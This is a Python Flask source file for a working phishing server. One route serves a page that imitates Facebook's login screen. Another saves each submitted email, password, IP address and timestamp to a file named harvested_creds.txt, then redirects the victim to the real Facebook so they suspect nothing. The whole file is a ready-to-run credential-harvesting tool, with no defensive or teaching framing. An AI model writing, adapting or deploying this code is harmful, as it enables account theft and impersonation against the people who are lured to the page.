from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/login', methods=['GET'])
def fake_login():
    # Mimics Facebook login page
    return '''
    <html>
    <head><title>Facebook - log in or sign up</title></head>
    <body style="background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Helvetica,Arial,sans-serif;">
    <div style="text-align:center;">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" width="250"><br><br>
        <div style="background:white;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);width:360px;">
            <form action="/capture" method="POST">
                <input name="email" type="text" placeholder="Email address or phone number"
                    style="width:90%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;"><br>
                <input name="password" type="password" placeholder="Password"
                    style="width:90%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;"><br>
                <button type="submit"
                    style="width:95%;padding:12px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;margin-top:6px;">
                    Log In</button>
            </form>
            <hr style="margin:16px 0;">
            <button style="padding:12px 24px;background:#42b72a;color:white;border:none;border-radius:6px;font-size:17px;font-weight:bold;">
                Create new account</button>
        </div>
    </div>
    </body></html>
    '''

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.remote_addr
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open('harvested_creds.txt', 'a') as f:
        f.write(f"[{timestamp}] IP: {ip} | Email: {email} | Password: {password}\n")

    print(f"[+] CAPTURED -> {email}:{password} from {ip}")

    # Redirect to real Facebook so victim suspects nothing
    return redirect('https://www.facebook.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
